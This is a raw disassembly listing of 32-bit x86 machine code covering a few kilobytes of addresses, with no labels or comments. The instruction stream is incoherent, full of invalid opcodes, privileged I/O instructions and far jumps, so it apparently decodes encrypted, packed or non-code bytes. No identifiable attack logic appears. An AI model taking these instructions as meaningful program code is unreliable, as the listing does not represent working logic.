  40add5:	inc    edi
  40add6:	pop    esi
  40add7:	clc    
  40add8:	sahf   
  40add9:	pusha  
  40adda:	push   edx
  40addb:	or     ah,bl
  40addd:	popf   
  40adde:	fdiv   QWORD PTR ds:0x4d4d9ef9
  40ade4:	push   edi
  40ade5:	jno    0x40ada3
  40ade7:	(bad)  [edi-0x6f]
  40adea:	inc    esi
  40adeb:	sbb    eax,0xb47a9ea6
  40adf0:	dec    ebp
  40adf1:	cli    
  40adf2:	loope  0x40adeb
  40adf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adf5:	adc    BYTE PTR [edi-0x19d70fae],bl
  40adfb:	push   esp
  40adfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adfd:	jmp    0x40ad8f
  40adff:	and    bh,ah
  40ae01:	xchg   edx,eax
  40ae02:	and    bl,BYTE PTR [edx]
  40ae04:	push   eax
  40ae05:	mov    ebp,0x783847da
  40ae0a:	aaa    
  40ae0b:	sub    edx,DWORD PTR [ebx+eax*2+0x7fb62bd9]
  40ae12:	mov    edx,0x20c94d51
  40ae17:	rcl    bh,cl
  40ae19:	test   al,0xf7
  40ae1b:	add    esp,ebp
  40ae1d:	mov    eax,DWORD PTR [esi]
  40ae1f:	adc    ebp,edi
  40ae21:	out    dx,al
  40ae22:	sar    BYTE PTR [edi+0x6],cl
  40ae25:	dec    ebp
  40ae26:	ret    0x82aa
  40ae29:	es in  eax,dx
  40ae2b:	adc    BYTE PTR [esi+ecx*4],dh
  40ae2e:	int3   
  40ae2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae30:	cmp    BYTE PTR [ebp+edx*8+0x6073bf79],ch
  40ae37:	stos   BYTE PTR es:[edi],al
  40ae38:	popf   
  40ae39:	cmp    DWORD PTR ds:0xfa65a633,eax
  40ae3f:	repnz fild WORD PTR [esi-0x7a]
  40ae43:	lahf   
  40ae44:	dec    ecx
  40ae45:	mov    WORD PTR gs:[edx-0x6d7d39f8],gs
  40ae4c:	inc    ebp
  40ae4d:	jne    0x40adf3
  40ae4f:	xchg   ecx,eax
  40ae50:	mov    bl,0xcf
  40ae52:	jmp    0x95a33b6c
  40ae57:	xchg   ecx,eax
  40ae58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae59:	push   ecx
  40ae5a:	lods   eax,DWORD PTR ds:[esi]
  40ae5b:	mov    eax,0x785aa2fb
  40ae60:	loop   0x40ae35
  40ae62:	xchg   edx,eax
  40ae63:	add    ecx,DWORD PTR [eax]
  40ae65:	int3   
  40ae66:	fsubr  QWORD PTR [esi-0x33d83152]
  40ae6c:	inc    ecx
  40ae6d:	out    0x6f,al
  40ae6f:	loope  0x40ae30
  40ae71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae72:	pop    ds
  40ae73:	push   ecx
  40ae74:	dec    esp
  40ae75:	or     eax,0xd70f9db2
  40ae7a:	repz xchg esp,eax
  40ae7c:	rcr    DWORD PTR [edi+0x33],0x2c
  40ae80:	pop    es
  40ae81:	pop    eax
  40ae82:	test   BYTE PTR [ebx],ch
  40ae84:	rol    BYTE PTR [ebx-0x31],cl
  40ae87:	shl    DWORD PTR [edx-0x4be1b307],1
  40ae8d:	or     edi,ebx
  40ae8f:	(bad)  
  40ae90:	shl    edx,cl
  40ae92:	mov    eax,ds:0xecd9fc4e
  40ae97:	inc    ebp
  40ae98:	xor    DWORD PTR [edi-0x42],eax
  40ae9b:	fidiv  WORD PTR [esi]
  40ae9d:	jl     0x40aef8
  40ae9f:	rcr    DWORD PTR [esi+0x7d],0xcd
  40aea3:	pop    ebp
  40aea4:	fild   QWORD PTR [edx]
  40aea6:	cmp    ebp,DWORD PTR [ecx+ebp*4+0x2bddd61c]
  40aead:	pop    esi
  40aeae:	js     0x40aea0
  40aeb0:	cmp    eax,0x3d922780
  40aeb5:	outs   dx,BYTE PTR ds:[esi]
  40aeb6:	in     eax,0xee
  40aeb8:	mov    ebp,0x1a11bbd1
  40aebd:	add    esp,DWORD PTR [ecx+eax*4]
  40aec0:	cmp    eax,0xb989ebc5
  40aec5:	xchg   ebp,eax
  40aec6:	inc    edi
  40aec7:	adc    eax,0x86c99cc9
  40aecc:	fwait
  40aecd:	adc    cl,ah
  40aecf:	push   ds
  40aed0:	mov    ds:0xf8a30a62,al
  40aed5:	fcom   QWORD PTR [edi]
  40aed7:	adc    dl,bl
  40aed9:	sbb    eax,0x99edff77
  40aede:	jmp    0xa2cbc402
  40aee3:	int    0x47
  40aee5:	add    BYTE PTR [eax],al
  40aee7:	lock jns 0x40af36
  40aeea:	aam    0xdf
  40aeec:	mov    eax,0x61566ed7
  40aef1:	pop    ebx
  40aef2:	mov    bh,0x8f
  40aef4:	loopne 0x40aefb
  40aef6:	lahf   
  40aef7:	lsl    ecx,WORD PTR [ecx+0xcc44698]
  40aefe:	mov    bh,BYTE PTR [ebp+edi*2-0x3255caa1]
  40af05:	inc    ecx
  40af06:	sub    BYTE PTR [ebx-0x14e4c8b5],0xf9
  40af0d:	mov    dl,0xd7
  40af0f:	push   ss
  40af10:	or     BYTE PTR [ebp-0x27],dh
  40af13:	sub    BYTE PTR [ecx-0x1b85533f],dh
  40af19:	and    eax,0xdaceb75a
  40af1e:	ficomp WORD PTR [ebx-0x21d72c7c]
  40af24:	xlat   BYTE PTR ds:[ebx]
  40af25:	cli    
  40af26:	jno    0x40aeb1
  40af28:	jbe    0x40af82
  40af2a:	xchg   edx,eax
  40af2b:	scas   eax,DWORD PTR es:[edi]
  40af2c:	call   0xbda7:0xe558f69f
  40af33:	sbb    BYTE PTR [ecx],ah
  40af35:	fsub   DWORD PTR [esi-0x1859b05]
  40af3b:	cmp    dl,BYTE PTR [edi]
  40af3d:	test   eax,0xc945d344
  40af42:	add    eax,0xb50c0146
  40af47:	add    DWORD PTR [ebx-0x40],eax
  40af4a:	test   eax,0xae2413e6
  40af4f:	dec    ebx
  40af50:	sbb    DWORD PTR [esi-0x2ff87adc],0xffffffe3
  40af57:	cmp    BYTE PTR [esi+edi*8+0x36],0xef
  40af5c:	push   esi
  40af5d:	inc    edi
  40af5e:	pop    esi
  40af5f:	mov    bl,0xe5
  40af61:	cmp    al,0x2f
  40af63:	mov    esi,DWORD PTR [edi-0x6ec09db8]
  40af69:	pushf  
  40af6a:	lods   al,BYTE PTR ds:[esi]
  40af6b:	mov    ah,0x2d
  40af6d:	add    eax,DWORD PTR [eax]
  40af6f:	push   eax
  40af70:	loope  0x40af44
  40af72:	jns    0x40af1a
  40af74:	lods   eax,DWORD PTR ds:[esi]
  40af75:	xor    ecx,DWORD PTR [edx+ecx*2]
  40af78:	mov    ch,0x3c
  40af7a:	adc    BYTE PTR [ebp-0xf11ea33],bl
  40af80:	add    al,0x71
  40af82:	arpl   WORD PTR [ecx],dx
  40af84:	add    DWORD PTR cs:[esp+esi*2-0x58],edx
  40af89:	shl    BYTE PTR [ecx-0xa],1
  40af8c:	in     al,dx
  40af8d:	mov    ch,0xc7
  40af8f:	add    BYTE PTR [ecx+0x5d5db04a],bl
  40af95:	dec    edx
  40af96:	fadd   QWORD PTR [edx-0x48]
  40af99:	dec    eax
  40af9a:	and    DWORD PTR [ebx],edi
  40af9c:	into   
  40af9d:	cmp    eax,0xabf34efe
  40afa2:	outs   dx,DWORD PTR ds:[esi]
  40afa3:	xchg   esp,eax
  40afa4:	adc    al,0x3e
  40afa6:	inc    edx
  40afa7:	cmp    BYTE PTR gs:[esi-0x78],bl
  40afab:	add    BYTE PTR [edx+esi*4+0x35],bl
  40afaf:	jno    0x40afae
  40afb1:	xchg   esp,eax
  40afb2:	push   edi
  40afb3:	pop    edi
  40afb4:	ror    DWORD PTR [ebp-0x23],1
  40afb7:	ror    ah,cl
  40afb9:	lods   al,BYTE PTR ds:[esi]
  40afba:	fwait
  40afbb:	sbb    BYTE PTR [eax-0x253aab1d],al
  40afc1:	imul   ebp,DWORD PTR [esi+eiz*4+0x3],0x896ba5b2
  40afc9:	lock loop 0x40afcf
  40afcc:	or     eax,0xbe2234c6
  40afd1:	mov    dl,0x81
  40afd3:	add    bh,dl
  40afd5:	fdiv   QWORD PTR [ecx]
  40afd7:	jb     0x40afe6
  40afd9:	jp     0x40b03d
  40afdb:	cmc    
  40afdc:	add    al,0xd3
  40afde:	adc    eax,0xee18f0e5
  40afe3:	mov    ecx,0x583c7e0c
  40afe8:	scas   al,BYTE PTR es:[edi]
  40afe9:	xor    al,0xf0
  40afeb:	in     eax,0xe8
  40afed:	push   ds
  40afee:	sti    
  40afef:	or     eax,0x46955e06
  40aff4:	repnz adc eax,0xc6792590
  40affa:	leave  
  40affb:	out    dx,eax
  40affc:	fisubr WORD PTR [ebx+eax*8]
  40afff:	addr16 add al,0x39
  40b002:	jge    0x40b083
  40b004:	mov    BYTE PTR [ecx-0x4d509183],dh
  40b00a:	bound  ecx,QWORD PTR [edx]
  40b00c:	cmp    edi,DWORD PTR [esi+edx*2-0x3470bf7a]
  40b013:	ja     0x40b05e
  40b015:	cmc    
  40b016:	sub    ah,BYTE PTR [edi]
  40b018:	popf   
  40b019:	sti    
  40b01a:	xor    eax,0xca548368
  40b01f:	sahf   
  40b020:	jle    0x40b075
  40b022:	inc    eax
  40b023:	push   cs
  40b024:	idiv   DWORD PTR [edx-0x4e]
  40b027:	es pop eax
  40b029:	push   cs
  40b02a:	dec    esp
  40b02b:	xlat   BYTE PTR ds:[ebx]
  40b02c:	dec    eax
  40b02d:	int3   
  40b02e:	pop    ebp
  40b02f:	pop    edx
  40b030:	mov    ds:0x3ea34689,al
  40b035:	lds    edi,FWORD PTR [ebx+0x4fd6174d]
  40b03b:	sahf   
  40b03c:	or     eax,0x5d7cfffe
  40b041:	ins    BYTE PTR es:[edi],dx
  40b042:	cmp    BYTE PTR [ebx],ah
  40b044:	enter  0xa3ea,0xbf
  40b048:	pop    edi
  40b049:	mov    al,0x60
  40b04b:	pop    ss
  40b04c:	ins    DWORD PTR es:[edi],dx
  40b04d:	cmp    bl,BYTE PTR [esi-0x38]
  40b050:	or     ebx,DWORD PTR [esi+0x2a4ad6ee]
  40b056:	inc    esi
  40b057:	adc    BYTE PTR [ecx],ah
  40b059:	data16 fbld TBYTE PTR [ebp+0x77]
  40b05d:	adc    dl,ah
  40b05f:	mov    ah,0x23
  40b061:	mul    DWORD PTR [edi]
  40b063:	pop    edx
  40b064:	imul   esi,DWORD PTR [edi],0x56
  40b067:	cmp    WORD PTR ds:0x3299a0b7,sp
  40b06e:	fidivr DWORD PTR [ebx]
  40b070:	lahf   
  40b071:	(bad)  [esi+0x39400482]
  40b077:	(bad)  
  40b078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b079:	hlt    
  40b07a:	xchg   edx,eax
  40b07b:	jmp    0x41b3:0x44e00343
  40b082:	or     BYTE PTR [eax-0x4a9b4113],ah
  40b088:	js     0x40b072
  40b08a:	xchg   esi,eax
  40b08b:	add    DWORD PTR [eax+0x59],eax
  40b08e:	sub    BYTE PTR [edx],0xf
  40b091:	xchg   ecx,eax
  40b092:	mov    ecx,DWORD PTR [esi-0x6531846e]
  40b098:	pop    DWORD PTR [ecx+ebx*2]
  40b09b:	or     al,0x1f
  40b09d:	mov    fs:0xeb870dea,eax
  40b0a3:	mov    ds:0xf79c6e1e,eax
  40b0a8:	xchg   ecx,eax
  40b0a9:	pop    esp
  40b0aa:	xchg   edi,eax
  40b0ab:	inc    eax
  40b0ac:	xlat   BYTE PTR ds:[ebx]
  40b0ad:	mov    esp,0x163b17fe
  40b0b2:	and    eax,0xc13cb83f
  40b0b7:	mov    esp,0xd32110c8
  40b0bc:	mov    WORD PTR [ebx-0x56],ss
  40b0bf:	pop    ds
  40b0c0:	add    al,0xda
  40b0c2:	mov    BYTE PTR [eax],al
  40b0c4:	mov    ecx,edx
  40b0c6:	inc    edx
  40b0c7:	add    BYTE PTR ds:0x1693661,dl
  40b0cd:	pop    eax
  40b0ce:	pop    esp
  40b0cf:	mov    ebx,0x932a3a2c
  40b0d4:	adc    DWORD PTR [edx+0x2e],edi
  40b0d7:	fadd   DWORD PTR [esi+edi*2+0x15]
  40b0db:	out    0xd1,eax
  40b0dd:	shl    esp,1
  40b0df:	dec    esp
  40b0e0:	pop    edx
  40b0e1:	pop    ds
  40b0e2:	(bad)  
  40b0e3:	mov    ds:0x4519d192,eax
  40b0e8:	call   0xb8e3:0xa7e366d
  40b0ef:	int3   
  40b0f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0f1:	and    eax,0xa9eb8b6a
  40b0f6:	cmp    esi,DWORD PTR [esi+eiz*8]
  40b0f9:	inc    ebx
  40b0fa:	dec    ebp
  40b0fb:	dec    edi
  40b0fc:	sub    eax,0x6ab97b37
  40b101:	outs   dx,DWORD PTR ds:[esi]
  40b102:	and    BYTE PTR [edi],0x55
  40b105:	jmp    0x40b156
  40b107:	out    dx,eax
  40b108:	dec    esi
  40b109:	xchg   ebx,eax
  40b10a:	add    dl,BYTE PTR [edx+0x65]
  40b10d:	pop    ecx
  40b10e:	sub    eax,0xc6acc871
  40b113:	mov    eax,0x6c6d5671
  40b118:	(bad)  
  40b119:	imul   BYTE PTR [ebx-0x44]
  40b11c:	sub    eax,0xe1b86ad4
  40b121:	and    edx,edx
  40b123:	mov    ch,0xaa
  40b125:	jle    0x40b0bf
  40b127:	mov    al,ds:0x947873cd
  40b12c:	and    eax,0x515dd162
  40b131:	fidiv  WORD PTR [ebx]
  40b133:	enter  0xc94c,0xd5
  40b137:	bound  eax,QWORD PTR [ebp-0x7ee7987f]
  40b13d:	dec    edi
  40b13e:	adc    DWORD PTR [ecx+ecx*1+0x55558dc9],ecx
  40b145:	sub    dl,BYTE PTR [edx]
  40b147:	xchg   edx,eax
  40b148:	sti    
  40b149:	hlt    
  40b14a:	mov    edx,DWORD PTR [edi]
  40b14c:	retf   
  40b14d:	arpl   WORD PTR [esi+0x3dd36865],cx
  40b153:	sub    BYTE PTR [ebx+0x57ab0c68],al
  40b159:	jne    0x40b1ad
  40b15b:	or     bl,BYTE PTR [edx]
  40b15d:	jg     0x40b152
  40b15f:	dec    eax
  40b160:	inc    ecx
  40b161:	arpl   WORD PTR [eax-0x16],ax
  40b164:	pop    ss
  40b165:	xchg   esi,eax
  40b166:	add    al,0x62
  40b168:	xchg   ebp,ebp
  40b16a:	push   ecx
  40b16b:	push   es
  40b16c:	fisubr DWORD PTR [esp+ecx*2]
  40b16f:	mov    edx,DWORD PTR [ecx]
  40b171:	ret    0xbea8
  40b174:	dec    ecx
  40b175:	outs   dx,DWORD PTR ds:[esi]
  40b176:	shr    DWORD PTR [ebp+eax*8-0x2bdb9cda],cl
  40b17d:	cmp    ah,BYTE PTR [edi+esi*4+0x3f]
  40b181:	sahf   
  40b182:	cmovbe ecx,edx
  40b185:	call   0x65107a67
  40b18a:	mov    DWORD PTR [esi],eax
  40b18c:	clc    
  40b18d:	loopne 0x40b1f3
  40b18f:	in     al,dx
  40b190:	mov    bl,0x13
  40b192:	jnp    0x40b20e
  40b194:	int    0x55
  40b196:	lods   al,BYTE PTR ds:[esi]
  40b197:	div    BYTE PTR [ebx+0x78ad64a0]
  40b19d:	or     DWORD PTR [esi-0x1f5050e],edx
  40b1a3:	mov    dl,0x30
  40b1a5:	scas   al,BYTE PTR es:[edi]
  40b1a6:	xchg   edx,eax
  40b1a7:	pop    esi
  40b1a8:	cli    
  40b1a9:	and    DWORD PTR [edi],0xc2fc4a1c
  40b1af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1b0:	test   DWORD PTR [edi-0x4a],ecx
  40b1b3:	into   
  40b1b4:	jno    0x40b148
  40b1b6:	xchg   DWORD PTR [esi],ebx
  40b1b8:	mov    edx,0xef40ff46
  40b1bd:	pusha  
  40b1be:	nop
  40b1bf:	(bad)  
  40b1c0:	call   0x13eb:0x8d04911e
  40b1c7:	stos   DWORD PTR es:[edi],eax
  40b1c8:	sub    BYTE PTR [edx],bh
  40b1ca:	sbb    al,0x5f
  40b1cc:	pop    es
  40b1cd:	div    dl
  40b1cf:	adc    eax,0xaad69a0a
  40b1d4:	xlat   BYTE PTR ds:[ebx]
  40b1d5:	or     ch,BYTE PTR [edi+0x10]
  40b1d8:	test   al,0x18
  40b1da:	dec    esi
  40b1db:	shl    DWORD PTR ds:0x47f981fd,0x5
  40b1e2:	imul   eax,DWORD PTR [edx+0x28],0x19
  40b1e6:	xchg   esi,eax
  40b1e7:	data16 das 
  40b1e9:	cmp    eax,0x5ccd5598
  40b1ee:	sahf   
  40b1ef:	push   ebp
  40b1f0:	sbb    al,0x9c
  40b1f2:	fisttp QWORD PTR [edi-0x1c46c656]
  40b1f8:	scas   al,BYTE PTR es:[edi]
  40b1f9:	xor    dh,BYTE PTR [edi+0x1b]
  40b1fc:	ss stos BYTE PTR es:[edi],al
  40b1fe:	xor    BYTE PTR [ebp-0xc],bl
  40b201:	add    eax,0x152f1d59
  40b206:	cs cmp eax,0x5f861704
  40b20c:	add    al,0xa6
  40b20e:	xor    BYTE PTR ds:0x63b794d2,0xab
  40b215:	dec    edx
  40b216:	mov    ecx,0x778b8639
  40b21b:	mov    ds:0xd8e417b2,al
  40b220:	ins    DWORD PTR es:[edi],dx
  40b221:	mov    bh,0x13
  40b223:	hlt    
  40b224:	jp     0x40b208
  40b226:	std    
  40b227:	(bad)  
  40b228:	jmp    0xfdade97b
  40b22d:	jns    0x40b1b4
  40b22f:	sub    esp,DWORD PTR ss:[esi]
  40b232:	sbb    DWORD PTR [edx-0x4addee50],edx
  40b238:	adc    dl,BYTE PTR [ebx-0x7daa754c]
  40b23e:	lock pop edi
  40b240:	mov    bh,0xc1
  40b242:	popf   
  40b243:	out    dx,eax
  40b244:	xor    eax,0xc5d20aa
  40b249:	pop    ds
  40b24a:	pop    ds
  40b24b:	push   eax
  40b24c:	push   eax
  40b24d:	test   ecx,esi
  40b24f:	inc    ecx
  40b250:	jae    0x40b1e9
  40b252:	inc    esi
  40b253:	pop    ebx
  40b254:	or     ah,BYTE PTR [esi]
  40b256:	push   es
  40b257:	mov    edx,0xfa1f8ded
  40b25c:	push   ecx
  40b25d:	cwde   
  40b25e:	pop    eax
  40b25f:	sbb    BYTE PTR [edi],0xf3
  40b262:	xor    al,0x6f
  40b264:	pop    edi
  40b265:	inc    ebx
  40b266:	push   ds
  40b267:	xchg   BYTE PTR [edx+0x8],dl
  40b26a:	mov    ds:0x4ba1922b,eax
  40b26f:	xchg   ebp,eax
  40b270:	and    ebp,DWORD PTR [ecx-0x5c]
  40b273:	inc    ebp
  40b274:	aam    0x5f
  40b276:	adc    eax,0xc0e43789
  40b27b:	sti    
  40b27c:	mov    ebx,0x83e3d041
  40b281:	push   esp
  40b282:	(bad)  
  40b283:	in     al,dx
  40b284:	push   es
  40b285:	pop    es
  40b286:	sub    eax,0xcabcf595
  40b28b:	fnstenv [edi]
  40b28d:	dec    esp
  40b28e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b28f:	lods   al,BYTE PTR ds:[esi]
  40b290:	pop    esi
  40b291:	adc    ecx,DWORD PTR [ebp+eiz*2-0x9]
  40b295:	icebp  
  40b296:	shl    BYTE PTR [ebx],cl
  40b298:	sbb    ebp,ebx
  40b29a:	inc    ebp
  40b29b:	retf   0x3860
  40b29e:	fidivr WORD PTR [edx+0x78]
  40b2a1:	or     eax,0x8925dfe5
  40b2a6:	xchg   DWORD PTR [edi-0x5c625bdb],edi
  40b2ac:	jnp    0x40b31a
  40b2ae:	test   DWORD PTR [edx+0x52],0x8593900
  40b2b5:	jnp    0x40b2e9
  40b2b7:	ja     0x40b2d1
  40b2b9:	cmp    DWORD PTR [ecx],esi
  40b2bb:	sub    bl,BYTE PTR [edx]
  40b2bd:	(bad)  
  40b2be:	mov    bl,0xc5
  40b2c0:	rol    BYTE PTR [ebp*8+0x2138bc0a],1
  40b2c7:	add    ebx,DWORD PTR [edx+0x153ef48]
  40b2cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2ce:	sub    ebx,DWORD PTR [edi-0x52cd1b5d]
  40b2d4:	xchg   edx,edx
  40b2d6:	jge    0x40b2a1
  40b2d8:	jg     0x40b2b9
  40b2da:	mov    cl,0xbb
  40b2dc:	loopne 0x40b2a1
  40b2de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2e0:	sti    
  40b2e1:	fdivr  QWORD PTR [esi]
  40b2e3:	sub    dh,bh
  40b2e5:	jae    0x40b356
  40b2e7:	xchg   ebp,eax
  40b2e8:	mov    eax,esi
  40b2ea:	and    edi,esp
  40b2ec:	lahf   
  40b2ed:	or     DWORD PTR [edi-0x48ebb8d7],esi
  40b2f3:	(bad)  
  40b2f4:	outs   dx,DWORD PTR ds:[esi]
  40b2f5:	lock cld 
  40b2f7:	daa    
  40b2f8:	mov    dh,0xae
  40b2fa:	or     edi,DWORD PTR [ecx-0xda7ed85]
  40b300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b301:	(bad)  [ecx+0x287e768]
  40b307:	add    BYTE PTR [ecx+ebp*2+0x2a6044bb],0x5e
  40b30f:	or     eax,DWORD PTR [ebx]
  40b311:	lods   al,BYTE PTR ds:[esi]
  40b312:	bound  eax,QWORD PTR [esi]
  40b314:	aaa    
  40b315:	jbe    0x40b33b
  40b317:	and    dl,BYTE PTR [esp+ebp*4]
  40b31a:	aam    0x40
  40b31c:	leave  
  40b31d:	xchg   ebx,eax
  40b31e:	sub    bh,BYTE PTR [eax]
  40b320:	xor    DWORD PTR [esi],eax
  40b322:	out    dx,al
  40b323:	iret   
  40b324:	in     al,dx
  40b325:	sar    DWORD PTR [eax+edx*8+0x2591fd7f],0xe
  40b32d:	inc    ebx
  40b32e:	add    esi,DWORD PTR [ecx]
  40b330:	imul   esp
  40b332:	in     al,0x8
  40b334:	mov    fs,esi
  40b336:	lds    edx,FWORD PTR [edx-0x24]
  40b339:	push   esi
  40b33a:	fldenv [edx]
  40b33c:	xchg   esp,eax
  40b33d:	nop
  40b33e:	lods   al,BYTE PTR ds:[esi]
  40b33f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b340:	aam    0x1
  40b342:	jmp    0x383043c1
  40b347:	rcr    DWORD PTR [edx+0x7ab37aab],0x33
  40b34e:	pop    es
  40b34f:	mov    ah,0xc2
  40b351:	fist   DWORD PTR [ebp-0x67]
  40b354:	inc    esi
  40b355:	cli    
  40b356:	push   ecx
  40b357:	sti    
  40b358:	sbb    BYTE PTR [ecx],dh
  40b35a:	jg     0x40b3ae
  40b35c:	(bad)  
  40b35d:	cmp    al,0x6c
  40b35f:	in     eax,dx
  40b360:	dec    ebp
  40b361:	and    BYTE PTR [esi+0x7eca9f98],0xaf
  40b368:	fist   DWORD PTR [ecx]
  40b36a:	xor    DWORD PTR [edx-0x5f],ebp
  40b36d:	xchg   ecx,eax
  40b36e:	fsqrt  
  40b370:	or     al,0x28
  40b372:	xchg   ebp,eax
  40b373:	pop    ebp
  40b374:	jmp    DWORD PTR [esi-0x2b]
  40b377:	inc    edi
  40b378:	mov    al,ds:0xf919f660
  40b37d:	sub    al,0x51
  40b37f:	xchg   ebp,eax
  40b380:	sub    ebp,ebx
  40b382:	or     esi,DWORD PTR [edx-0x3a28547c]
  40b388:	push   ebp
  40b389:	(bad)  
  40b38b:	out    0xa3,eax
  40b38d:	and    bh,ah
  40b38f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b390:	popa   
  40b391:	mov    edi,0xa3db345e
  40b396:	sti    
  40b397:	aaa    
  40b398:	fs cli 
  40b39a:	ds jle 0x40b3f0
  40b39d:	pusha  
  40b39e:	shl    ebx,0x61
  40b3a1:	dec    edx
  40b3a2:	std    
  40b3a3:	lods   al,BYTE PTR ds:[esi]
  40b3a4:	push   esp
  40b3a5:	mov    ecx,0x9fb8d9ce
  40b3aa:	call   0x11103916
  40b3af:	nop
  40b3b0:	(bad)  
  40b3b2:	jne    0x40b41b
  40b3b4:	or     ebx,DWORD PTR fs:[ecx+0x4e]
  40b3b8:	add    eax,0x5e86daf9
  40b3bd:	adc    BYTE PTR [ebx-0x6c],0xe0
  40b3c1:	push   eax
  40b3c2:	(bad)  
  40b3c3:	retf   0x2e9a
  40b3c6:	lea    esi,[ebp+0x6c7fac9]
  40b3cc:	mov    esi,0x8355a7a6
  40b3d1:	pushf  
  40b3d2:	sar    DWORD PTR [ebp-0x6e06e609],cl
  40b3d8:	inc    ebx
  40b3d9:	jne    0x40b3c4
  40b3db:	sbb    DWORD PTR [esi-0x7a],esi
  40b3de:	rol    DWORD PTR [esi-0x57],1
  40b3e1:	push   ecx
  40b3e2:	sbb    esi,DWORD PTR [edx]
  40b3e4:	cmp    al,dh
  40b3e6:	leave  
  40b3e7:	xor    edx,DWORD PTR [edi+0x47f003a7]
  40b3ed:	and    al,0xbc
  40b3ef:	mov    ecx,0x80c406d4
  40b3f4:	jns    0x40b37d
  40b3f6:	popa   
  40b3f7:	pushf  
  40b3f8:	adc    ah,BYTE PTR [ebx-0x74]
  40b3fb:	and    al,0x1f
  40b3fd:	mov    ch,BYTE PTR ds:0x95345ae1
  40b403:	push   ebx
  40b404:	ret    
  40b405:	call   0xb70a:0x53bd6670
  40b40c:	sbb    ecx,eax
  40b40e:	ds jb  0x40b460
  40b411:	adc    DWORD PTR [edx-0x79bc1f67],eax
  40b417:	pop    ds
  40b418:	in     al,dx
  40b419:	sub    eax,0x42bfa073
  40b41e:	mov    dh,0x4c
  40b420:	pusha  
  40b421:	mov    ebp,0xc9663375
  40b426:	retf   0x1c8
  40b429:	lods   al,BYTE PTR ds:[esi]
  40b42a:	cmp    eax,0x4f3e3bec
  40b42f:	daa    
  40b430:	sti    
  40b431:	and    ah,BYTE PTR [ebp-0x16b5102b]
  40b437:	mov    eax,DWORD PTR [eax-0x28]
  40b43a:	add    al,0x4f
  40b43c:	lahf   
  40b43d:	(bad)  
  40b43e:	dec    esp
  40b43f:	rol    ebp,0xda
  40b442:	pop    es
  40b443:	pushf  
  40b444:	jp     0x40b3dd
  40b446:	call   0xb82c:0x1ba83bcf
  40b44d:	int    0x43
  40b44f:	fisttp QWORD PTR [ebx+0x1e]
  40b452:	dec    ebp
  40b453:	cld    
  40b454:	test   DWORD PTR [ecx+0x2e3f4512],edx
  40b45a:	iret   
  40b45b:	push   ss
  40b45c:	sbb    DWORD PTR [ebx+0x7a8e867f],0xffffffb2
  40b463:	neg    bh
  40b465:	imul   ebp
  40b467:	jg     0x40b462
  40b469:	cld    
  40b46a:	add    al,0xa3
  40b46c:	cmovg  ebx,ecx
  40b46f:	xor    al,BYTE PTR [esi+0x65655b17]
  40b475:	jecxz  0x40b4e9
  40b477:	xchg   edx,eax
  40b478:	push   0xffffffac
  40b47a:	loope  0x40b4b1
  40b47c:	ins    DWORD PTR es:[edi],dx
  40b47d:	call   0xf39d38a5
  40b482:	jns    0x40b455
  40b484:	and    dl,BYTE PTR [ebx]
  40b486:	scas   al,BYTE PTR es:[edi]
  40b487:	daa    
  40b488:	sub    DWORD PTR [edx+ebp*4],ecx
  40b48b:	shr    BYTE PTR [ecx-0x62],1
  40b48e:	cld    
  40b48f:	fwait
  40b490:	inc    eax
  40b491:	jecxz  0x40b431
  40b493:	adc    eax,0xa3475c7e
  40b498:	shl    DWORD PTR [edi-0x102b47e0],1
  40b49e:	mov    esi,0xcb53aa7f
  40b4a3:	push   edx
  40b4a4:	ss inc ecx
  40b4a6:	adc    DWORD PTR [edx+edx*2-0x2c14166a],edx
  40b4ad:	mov    ds,WORD PTR [edi]
  40b4af:	push   esi
  40b4b0:	arpl   WORD PTR [esi-0x6a],bp
  40b4b3:	sub    eax,0xdcb80d7d
  40b4b8:	mov    WORD PTR [ecx],gs
  40b4ba:	jp     0x40b44a
  40b4bc:	sub    al,BYTE PTR [eax]
  40b4be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4bf:	push   edx
  40b4c0:	dec    edx
  40b4c1:	xchg   ebp,eax
  40b4c3:	adc    BYTE PTR [edx+eiz*4],dl
  40b4c6:	ins    DWORD PTR es:[edi],dx
  40b4c7:	xchg   DWORD PTR [edx],esp
  40b4c9:	ror    BYTE PTR [ecx+ebx*8],cl
  40b4cc:	and    eax,0xb65d53e8
  40b4d1:	mov    ds:0x8720317f,al
  40b4d6:	and    eax,0x1a0179d
  40b4db:	outs   dx,BYTE PTR ds:[esi]
  40b4dc:	sub    cl,BYTE PTR [esi]
  40b4de:	dec    esp
  40b4df:	stos   BYTE PTR es:[edi],al
  40b4e0:	sbb    al,0x1d
  40b4e2:	scas   eax,DWORD PTR es:[edi]
  40b4e3:	mov    ebp,0xcc7bf05d
  40b4e8:	mov    DWORD PTR [ecx+0x7d],esp
  40b4eb:	loope  0x40b48f
  40b4ed:	dec    esp
  40b4ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4ef:	mov    ch,cl
  40b4f1:	or     eax,DWORD PTR [eax+0x41]
  40b4f4:	ret    
  40b4f5:	pop    esi
  40b4f6:	and    ebp,DWORD PTR [edx+0x30ae66b]
  40b4fc:	pop    edx
  40b4fd:	shr    BYTE PTR [edi-0x2c],0xc
  40b501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b502:	scas   al,BYTE PTR es:[edi]
  40b503:	mov    esi,0x1ad63137
  40b508:	adc    al,dh
  40b50a:	(bad)  
  40b50b:	js     0x40b4e4
  40b50d:	scas   eax,DWORD PTR es:[edi]
  40b50e:	call   0x4eaf:0x592ae633
